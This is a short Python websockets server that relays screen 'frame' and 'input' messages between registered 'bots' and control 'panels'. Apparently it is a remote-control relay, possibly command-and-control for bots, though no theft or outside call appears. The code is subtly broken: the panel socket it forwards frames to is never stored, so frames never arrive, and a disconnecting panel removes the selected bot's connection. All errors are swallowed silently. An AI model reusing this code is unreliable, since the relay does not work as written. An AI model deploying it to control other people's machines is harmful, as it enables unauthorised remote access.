# -*- coding: utf-8 -*-
import asyncio, json, os
import websockets

rooms = {}
panels = {}

async def handler(ws):
    bot_id = None
    try:
        async for msg in ws:
            data = json.loads(msg)
            t = data.get('type')
            
            if t == 'bot_register':
                bot_id = data['id']
                rooms.setdefault(bot_id, {})['bot'] = ws
                for p in panels:
                    if panels[p] == bot_id or panels[p] is None:
                        try: await p.send(json.dumps({'type':'bot_online','id':bot_id}))
                        except: pass
                await ws.send(json.dumps({'type':'ok'}))
            
            elif t == 'panel_register':
                panels[ws] = None
                await ws.send(json.dumps({'type':'bot_list','ids':list(rooms.keys())}))
            
            elif t == 'panel_select':
                panels[ws] = data['id']
                bot_id = data['id']
                await ws.send(json.dumps({'type':'selected','id':bot_id}))
            
            elif t == 'frame' and bot_id:
                room = rooms.get(bot_id, {})
                p = room.get('panel_ws')
                if p:
                    try: await p.send(msg)
                    except: pass
            
            elif t == 'input' and bot_id:
                room = rooms.get(bot_id, {})
                b = room.get('bot')
                if b:
                    try: await b.send(msg)
                    except: pass
    except Exception:
        pass
    finally:
        if bot_id and bot_id in rooms:
            rooms[bot_id].pop('bot', None)
        if ws in panels:
            panels.pop(ws, None)

async def main():
    port = int(os.environ.get('PORT', 8080))
    async with websockets.serve(handler, '0.0.0.0', port):
        await asyncio.Future()

if __name__ == '__main__':
    asyncio.run(main())
